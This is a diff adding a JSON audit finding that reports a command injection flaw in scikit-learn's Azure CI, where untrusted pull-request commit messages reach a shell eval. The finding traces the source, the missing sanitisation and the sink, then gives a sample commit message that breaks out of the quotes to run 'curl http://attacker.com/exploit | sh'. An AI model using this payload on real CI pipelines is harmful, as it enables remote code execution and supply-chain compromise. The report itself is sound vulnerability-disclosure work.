@@ -1,0 +1,17 @@
+[
+  {
+    "finding_id": "d6d3799a-9a58-537b-be6a-dc20967b3327",
+    "session_id": "ChAxOTQ3NmVkMjhiMzNiMmViEAgaATAqBG1haW4",
+    "title": "Command Injection via Pull Request Commit Message in CI Pipeline",
+    "file_path": "/home/jfplante_google_com/repos/p03-scikit-learn_rep1/build_tools/azure/test_script.sh",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "### Source\nAn untrusted contributor can submit a Pull Request to the repository. They control the commit message of the commits in their pull request branch.\nIn `build_tools/azure/get_commit_message.py`, when a build is triggered for a Pull Request, `git log` is used to retrieve the latest commit message of the PR:\n```python\ncommit_message = subprocess.run(\n    git_cmd, capture_output=True, text=True\n).stdout.strip()\n```\n\n### Sanitization / Validation\nIn `build_tools/azure/get_selected_tests.py`, the commit message is parsed:\n```python\nif \"[all random seeds]\" in commit_message:\n    selected_tests = commit_message.split(\"[all random seeds]\")[1].strip()\n    selected_tests = selected_tests.replace(\"\\n\", \" or \")\n```\nThe variable `selected_tests` is then output to Azure Pipelines via:\n```python\nprint(f\"##vso[task.setvariable variable=SELECTED_TESTS]'{selected_tests}'\")\n```\nNo validation or shell-escaping is performed on `selected_tests` (it only replaces newlines with \" or \" and wraps them in single quotes).\n\n### Sink\nIn `build_tools/azure/test_script.sh`, the variable `SELECTED_TESTS` is directly appended to `TEST_CMD` and subsequently evaluated using `eval`:\n```bash\nif [[ -n \"$SELECTED_TESTS\" ]]; then\n    TEST_CMD=\"$TEST_CMD -k $SELECTED_TESTS\"\n...\neval \"$TEST_CMD\"\n```\nBecause the untrusted `$SELECTED_TESTS` contains literal single quotes added by the python script (which can be closed by the attacker) and is evaluated by the shell via `eval`, an attacker can inject arbitrary shell commands.\n\n### Conceptual Exploit Payload\nA contributor submits a pull request with a commit message of the form:\n```\nCommit Title [all random seeds]\nfoo' or test_some_name; curl http://attacker.com/exploit | sh; #\n```\nWhen `get_selected_tests.py` runs, it will set `SELECTED_TESTS` to:\n`'foo' or test_some_name; curl http://attacker.com/exploit | sh; #'`\nIn `test_script.sh`, `$SELECTED_TESTS` is interpolated into `$TEST_CMD`, resulting in:\n`python -m pytest --showlocals --durations=20 --junitxml=$JUNITXML -k 'foo' or test_some_name; curl http://attacker.com/exploit | sh; #`\nWhen `eval \"$TEST_CMD\"` executes, the shell parses and runs the injected command:\n`curl http://attacker.com/exploit | sh`",
+    "snippet": "if [[ -n \"$SELECTED_TESTS\" ]]; then\n    TEST_CMD=\"$TEST_CMD -k $SELECTED_TESTS\"\n\n    # Override to make selected tests run on all random seeds\n    export SKLEARN_TESTS_GLOBAL_RANDOM_SEED=\"all\"\nfi\n\nTEST_CMD=\"$TEST_CMD --pyargs sklearn\"\nif [[ \"$DISTRIB\" == \"conda-pypy3\" ]]; then\n    # Run only common tests for PyPy. Running the full test suite uses too\n    # much memory and causes the test to time out sometimes. See\n    # https://github.com/scikit-learn/scikit-learn/issues/27662 for more\n    # details.\n    TEST_CMD=\"$TEST_CMD.tests.test_common\"\nfi\n\nset -x\neval \"$TEST_CMD\"",
+    "vuln_type": "Command Injection",
+    "vuln_id": "CWE-78",
+    "status": "OPEN",
+    "start_line": 56,
+    "end_line": 73
+  }
+]
